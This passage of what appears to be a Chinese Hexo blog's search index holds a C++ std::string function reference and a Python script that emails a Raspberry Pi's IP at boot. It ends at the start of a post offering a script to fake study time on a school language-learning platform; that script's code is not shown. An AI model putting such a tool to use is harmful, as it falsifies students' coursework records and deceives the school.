class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从pos开始查找字符c在当前字符串的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始查找字符串s在当前串中的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始查找字符串s中前n个字符在当前串中的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos, <span class="keyword">int</span> n)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始查找字符串s在当前串中的位置</span></span><br><span class="line"><span class="comment">//查找成功时返回所在位置，失败返回string::npos的值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始从后向前查找字符c在当前串中的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rfind</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rfind</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rfind</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos, <span class="keyword">int</span> n = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rfind</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始从后向前查找字符串s中前n个字符组成的字符串在当前串中的位置，成功返回所在位置，失败时返回string::npos的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始查找字符c第一次出现的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_of</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos, <span class="keyword">int</span> n)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_of</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从pos开始查找当前串中第一个在s的前n个字符组成的数组里的字符的位置。查找失败返回string::npos</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_not_of</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_not_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_not_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos,<span class="keyword">int</span> n)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_first_not_of</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从当前串中查找第一个不在串s中的字符出现的位置，失败返回string::npos</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_of</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos, <span class="keyword">int</span> n = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_of</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_not_of</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_not_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_not_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos,<span class="keyword">int</span> n)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_last_not_of</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//find_last_of和find_last_not_of与find_first_of和find_first_not_of相似，只不过是从后向前查找</span></span><br></pre></td></tr></table></figure><h2 id="string类的替换函数："><a href="#string类的替换函数：" class="headerlink" title="string类的替换函数："></a>string类的替换函数：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除从p0开始的n0个字符，然后在p0处插入串s</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">int</span> n0,<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除p0开始的n0个字符，然后在p0处插入字符串s的前n个字符</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">int</span> n0,<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除从p0开始的n0个字符，然后在p0处插入串s</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">int</span> n0,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除p0开始的n0个字符，然后在p0处插入串s中从pos开始的n个字符</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">int</span> n0,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s, <span class="keyword">int</span> pos, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除p0开始的n0个字符，然后在p0处插入n个字符c</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">int</span> n0,<span class="keyword">int</span> n, <span class="keyword">char</span> c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把[first0，last0）之间的部分替换为字符串s</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(iterator first0, iterator last0,<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把[first0，last0）之间的部分替换为s的前n个字符</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(iterator first0, iterator last0,<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把[first0，last0）之间的部分替换为串s</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(iterator first0, iterator last0,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把[first0，last0）之间的部分替换为n个字符c</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(iterator first0, iterator last0,<span class="keyword">int</span> n, <span class="keyword">char</span> c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把[first0，last0）之间的部分替换成[first，last）之间的字符串string类的插入函：</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">replace</span><span class="params">(iterator first0, iterator last0,const_iterator first,const_iteratorlast)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">insert</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">insert</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">insert</span><span class="params">(<span class="keyword">int</span> p0,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">insert</span><span class="params">(<span class="keyword">int</span> p0,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s, <span class="keyword">int</span> pos, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="comment">//前4个函数在p0位置插入字符串s中pos开始的前n个字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//此函数在p0处插入n个字符c</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">insert</span><span class="params">(<span class="keyword">int</span> p0, <span class="keyword">int</span> n, <span class="keyword">char</span> c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在it处插入字符c，返回插入后迭代器的位置</span></span><br><span class="line"><span class="function">iterator <span class="title">insert</span><span class="params">(iterator it, <span class="keyword">char</span> c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在it处插入[first，last）之间的字符</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(iterator it, const_iterator first, const_iterator last)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在it处插入n个字符c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(iterator it, <span class="keyword">int</span> n, <span class="keyword">char</span> c)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="string类的删除函数"><a href="#string类的删除函数" class="headerlink" title="string类的删除函数"></a>string类的删除函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除[first，last）之间的所有字符，返回删除后迭代器的位置</span></span><br><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator first, iterator last)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除it指向的字符，返回删除后迭代器的位置</span></span><br><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator it)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除pos开始的n个字符，返回修改后的字符串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">erase</span><span class="params">(<span class="keyword">int</span> pos = <span class="number">0</span>, <span class="keyword">int</span> n = npos)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="string类的迭代器处理："><a href="#string类的迭代器处理：" class="headerlink" title="string类的迭代器处理："></a>string类的迭代器处理：</h2><p>string类提供了向前和向后遍历的迭代器iterator，迭代器提供了访问各个字符的语法，类似于指针操作，迭代器不检查范围。</p><p>用string::iterator或string::const_iterator声明迭代器变量，const_iterator不允许改变迭代的内容。</p><h3 id="常用迭代器函数有："><a href="#常用迭代器函数有：" class="headerlink" title="常用迭代器函数有："></a>常用迭代器函数有：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">const_iterator <span class="title">begin</span><span class="params">()</span><span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">iterator <span class="title">begin</span><span class="params">()</span></span>; <span class="comment">//返回string的起始位置</span></span><br><span class="line"></span><br><span class="line"><span class="function">const_iterator <span class="title">end</span><span class="params">()</span><span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">iterator <span class="title">end</span><span class="params">()</span></span>;<span class="comment">//返回string的最后一个字符后面的位置</span></span><br><span class="line"></span><br><span class="line"><span class="function">const_iterator <span class="title">rbegin</span><span class="params">()</span><span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">iterator <span class="title">rbegin</span><span class="params">()</span></span>; <span class="comment">//返回string的最后一个字符的位置</span></span><br><span class="line"></span><br><span class="line"><span class="function">const_iterator <span class="title">rend</span><span class="params">()</span><span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">iterator <span class="title">rend</span><span class="params">()</span></span>;<span class="comment">//返回string第一个字符位置的前面rbegin</span></span><br><span class="line"></span><br><span class="line">和rend用于从后向前的迭代访问，通过设置迭代器</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>::reverse_iterator,<span class="built_in">string</span>::const_reverse_iterator实现</span><br></pre></td></tr></table></figure><h2 id="字符串流处理："><a href="#字符串流处理：" class="headerlink" title="字符串流处理："></a>字符串流处理：</h2><p>通过定义ostringstream和istringstream变量实现，<sstream>头文件中</p><h3 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">input</span><span class="params">(<span class="string">"hello,this is a test"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">istringstream</span> <span class="title">is</span><span class="params">(input)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> s1,s2,s3,s4;</span><br><span class="line"></span><br><span class="line">is&gt;&gt;s1&gt;&gt;s2&gt;&gt;s3&gt;&gt;s4;<span class="comment">//s1="hello,this",s2="is",s3="a",s4="test"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ostringstream</span> os;</span><br><span class="line"></span><br><span class="line">os&lt;&lt;s1&lt;&lt;s2&lt;&lt;s3&lt;&lt;s4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;os.str();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> string </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派开机发送IP到指定邮箱的脚本</title>
      <link href="/2018/raspberry-pi-boot-script-to-send-IP-to-specified-email.html"/>
      <url>/2018/raspberry-pi-boot-script-to-send-IP-to-specified-email.html</url>
      
        <content type="html"><![CDATA[<p>本脚本使用的是腾讯企业邮的smtp服务，可以根据需求进行相应修改</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmail</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.user = <span class="literal">None</span></span><br><span class="line">        self.passwd = <span class="literal">None</span></span><br><span class="line">        self.to_list = []</span><br><span class="line">        self.cc_list = []</span><br><span class="line">        self.tag = <span class="literal">None</span></span><br><span class="line">        self.doc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        发送邮件</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP_SSL(<span class="string">"smtp.exmail.qq.com"</span>, port=<span class="number">465</span>)</span><br><span class="line">            server.login(self.user, self.passwd)</span><br><span class="line">            server.sendmail(<span class="string">"&lt;%s&gt;"</span> % self.user, self.to_list, self.get_attach())</span><br><span class="line">            server.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"send email successful"</span></span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"send email failed %s"</span> % e45</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_attach</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        构造邮件内容</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        attach = MIMEMultipart()</span><br><span class="line"></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">"1.1.1.1"</span>, <span class="number">80</span>))</span><br><span class="line">        txt = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">        s.close()</span><br><span class="line">        txt = MIMEText(txt)</span><br><span class="line">        attach.attach(txt)</span><br><span class="line">        <span class="keyword">if</span> self.tag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 主题,最上面的一行</span></span><br><span class="line">            attach[<span class="string">"Subject"</span>] = self.tag</span><br><span class="line">        <span class="keyword">if</span> self.user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 显示在发件人</span></span><br><span class="line">            attach[<span class="string">"From"</span>] = <span class="string">"PI&lt;%s&gt;"</span> % self.user</span><br><span class="line">        <span class="keyword">if</span> self.to_list:</span><br><span class="line">            <span class="comment"># 收件人列表</span></span><br><span class="line">            attach[<span class="string">"To"</span>] = <span class="string">";"</span>.join(self.to_list)</span><br><span class="line">        <span class="keyword">if</span> self.cc_list:</span><br><span class="line">            <span class="comment"># 抄送列表</span></span><br><span class="line">            attach[<span class="string">"Cc"</span>] = <span class="string">";"</span>.join(self.cc_list)</span><br><span class="line">        <span class="keyword">if</span> self.doc:</span><br><span class="line">            <span class="comment"># 估计任何文件都可以用base64，比如rar等</span></span><br><span class="line">            <span class="comment"># 文件名汉字用gbk编码代替</span></span><br><span class="line">            name = os.path.basename(self.doc).encode(<span class="string">"gbk"</span>)</span><br><span class="line">            f = open(self.doc, <span class="string">"rb"</span>)</span><br><span class="line">            doc = MIMEText(f.read(), <span class="string">"base64"</span>, <span class="string">"gb2312"</span>)</span><br><span class="line">            doc[<span class="string">"Content-Type"</span>] = <span class="string">'application/octet-stream'</span></span><br><span class="line">            doc[<span class="string">"Content-Disposition"</span>] = <span class="string">'attachment; filename="'</span> + name + <span class="string">'"'</span></span><br><span class="line">            attach.attach(doc)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> attach.as_string()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    my = MyEmail()</span><br><span class="line"></span><br><span class="line">    my.user = <span class="string">"username@example.com"</span></span><br><span class="line">    my.passwd = <span class="string">"password"</span></span><br><span class="line">    my.to_list = [<span class="string">"username@126.com"</span>, ]</span><br><span class="line">    my.cc_list = [<span class="string">""</span>, ]</span><br><span class="line">    my.tag = <span class="string">"PI IP"</span></span><br><span class="line">    my.doc = <span class="literal">None</span> <span class="comment">#u"C:\Documents and Settings\Administrator\Desktop\日报.doc"</span></span><br><span class="line">    my.send()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> raspberry </tag>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新理念外语网络教学平台脚本刷时长</title>
      <link href="/2018/new-concept-foreign-language-online-teaching-platform-script.html"/>
      <url>/2018/new-concept-foreign-language-online-teaching-platform-script.html</url>
      
        <content type="html"><![CDATA[<p>这是我们学校用的平台，自己写了一个脚本，可以用来刷时间，可以多开同时刷。20分钟刷一册书不是问题。<br>有需要的拿去，随便改改就能用。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 